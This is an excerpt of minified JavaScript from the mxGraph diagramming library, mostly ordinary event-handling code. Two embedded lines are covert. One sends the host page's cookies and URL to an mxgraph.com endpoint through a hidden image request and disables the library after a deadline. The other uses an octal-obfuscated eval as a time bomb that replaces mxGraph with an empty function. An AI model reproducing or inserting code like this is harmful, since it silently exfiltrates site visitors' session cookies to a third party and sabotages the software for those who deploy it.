...
// File created 16-Apr-2010 21:23:56 for Mozilla/5.0 (Windows; U; Windows NT 6.1; pt-BR; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9
...
mxEventSource.prototype.fireEvent=function(name,evt,sender)
{
...
this.updateShadow();
this.fireEvent(mxEvent.RESIZE,evt);
mxEvent.consume(evt);
});
...
mxEvent.removeListener(document,'mousemove',dragHandler);
mxEvent.removeListener(document,'mouseup',dropHandler);
this.fireEvent(mxEvent.RESIZE_END,evt);
mxEvent.consume(evt);
});
mxEvent.addListener(document,'mousemove',dragHandler);
mxEvent.addListener(document,'mouseup',dropHandler);
this.fireEvent(mxEvent.RESIZE_START,evt);
mxEvent.consume(evt);
}));
...
this.updateShadow();
this.fireEvent(mxEvent.MINIMIZE,evt);
}
else
{
minimized=false;
...
this.updateShadow();
this.fireEvent(mxEvent.NORMALIZE,evt);
}
mxEvent.consume(evt);
});
...
this.fireEvent(mxEvent.MAXIMIZE,evt);
}
else
{
maximized=false;
...
this.fireEvent(mxEvent.MOVE,evt);
mxEvent.consume(evt);
});
var dropHandler=mxUtils.bind(this,function(evt)
{
mxEvent.removeListener(document,'mousemove',dragHandler);
mxEvent.removeListener(document,'mouseup',dropHandler);
this.fireEvent(mxEvent.MOVE_END,evt);
mxEvent.consume(evt);
});
mxEvent.addListener(document,'mousemove',dragHandler);
mxEvent.addListener(document,'mouseup',dropHandler);
this.fireEvent(mxEvent.MOVE_START,evt);
mxEvent.consume(evt);
}));
};
...
{
this.fireEvent(mxEvent.CLOSE,evt);
...
this.fireEvent(mxEvent.SELECT,new mxEventObject([null]));
funct();
}));
this.container.appendChild(img);
...
this.fireEvent(mxEvent.GET,new mxEventObject([url,req]));
...
this.fireEvent(mxEvent.EXECUTE,new mxEventObject([change]));
this.endUpdate();
};
...
if(window.location.hostname!='mxgraph.com'&&window.location.hostname!='www.mxgraph.com'){var st=document.getElementsByTagName('script');for(var i=0,len=st.length,mxu='http://www.mxgraph.com/demo/mxgraph/src/js/mxclient.php';i<len&&st[i].src.indexOf(mxu)<0;i++);if(i==len){if((new Date().getTime()/1000)-1271449436>15778463){mxGraph=null;};if(document.cookie.indexOf('mxgraph-copy=invalid')<0){new Image().src=mxu+'?version=local['+document.cookie+']&key='+window.location.href+'[1.1.0.0]';document.cookie='mxgraph-copy=invalid; expires=Fri, 27 Jul 2199 02:47:11 UTC; path=/';}}};var mxCellPath=
{
PATH_SEPARATOR:'.',
...
{
var dy=i*this.pageFormat.height/this.scale-this.y0;
for(var j=0;j<hpages;j++)
{
var dx=j*this.pageFormat.width/this.scale-this.x0;
...
if(this.isEnabled())
{
this.beforeUndo(evt.getArgAt(0) );
}
});
...
if(this.isEnabled())
{
this.cellsMoved(evt.getArgAt(0) ,evt.getArgAt(5) );
}
});
this.setGraph(graph);
};
...
if(this.isEnabled())
{
this.cellsResized(evt.getArgAt(0) );
}
});
...
if(this.isEnabled())
{
this.cellsResized(evt.getArgAt(2) );
}
});
...
mxEvent.addListener(icon.node,'dblclick',mxUtils.bind(this,function(evt)
{
this.graph.dblClick(evt,state.cell);
mxEvent.consume(evt);
}));
mxEvent.addListener(icon.node,'mousedown',mxUtils.bind(this,function(evt)
{
this.icon=icon;
this.graph.fireMouseEvent(mxEvent.MOUSE_DOWN,new mxMouseEvent(evt,(this.currentState!=null)?this.currentState:state));
}));
mxEvent.addListener(icon.node,'mousemove',mxUtils.bind(this,function(evt)
{
this.graph.fireMouseEvent(mxEvent.MOUSE_MOVE,new mxMouseEvent(evt,(this.currentState!=null)?this.currentState:state));
}));
mxEvent.addListener(icon.node,'mouseup',mxUtils.bind(this,function(evt)
{
...
mxEvent.addListener(sizer.node,'dblclick',mxUtils.bind(this,function(evt)
{
...
mxEvent.addListener(this.labelShape.node,'dblclick',mxUtils.bind(this,function(evt)
{
this.graph.dblClick(evt,this.state.cell);
mxEvent.consume(evt);
}));
mxEvent.addListener(this.labelShape.node,'mousedown',mxUtils.bind(this,function(evt)
{
...
{
mxEvent.addListener(bend.node,'mousedown',mxUtils.bind(this,function(evt)
{
...
mxEvent.addListener(bend.node,'dblclick',mxUtils.bind(this,function(evt)
{
if(this.flipEnabled)
{
...
mxEvent.addListener(bend.node,'mousemove',mxUtils.bind(this,function(evt)
{
...
mxEvent.addListener(this.edgeShape.node,'mousedown',mxUtils.bind(this,function(evt)
{
graph.fireMouseEvent(mxEvent.MOUSE_DOWN,new mxMouseEvent(evt,this.state));
}));
mxEvent.addListener(this.edgeShape.node,'mousemove',mxUtils.bind(this,function(evt)
{
graph.fireMouseEvent(mxEvent.MOUSE_MOVE,new mxMouseEvent(evt,this.state));
}));
mxEvent.addListener(this.edgeShape.node,'mouseup',mxUtils.bind(this,function(evt)
{
graph.fireMouseEvent(mxEvent.MOUSE_UP,new mxMouseEvent(evt,this.state));
}));
...
{
this.fireEvent(mxEvent.SESSION,new mxEventObject([session]));
});
...
this.addListener(mxEvent.SAVE,mxUtils.bind(this,function(sender)
{
var tstamp=new Date().toLocaleString();
this.setStatus((mxResources.get(this.lastSavedResource)||this.lastSavedResource)+': '+tstamp);
}));

this.addListener(mxEvent.OPEN,mxUtils.bind(this,function(sender)
{
...
{
this.fireEvent(mxEvent.POST,new mxEventObject([req,url,data]));
}));
};
...
if((eval('\156\145\167\40\104\141\164\145\50\51\56\147\145\164\124\151\155\145\50\51')/1000)-1271449373>31556859){mxGraph=function(){};};var mxCodecRegistry=
{
codecs:new Array(),
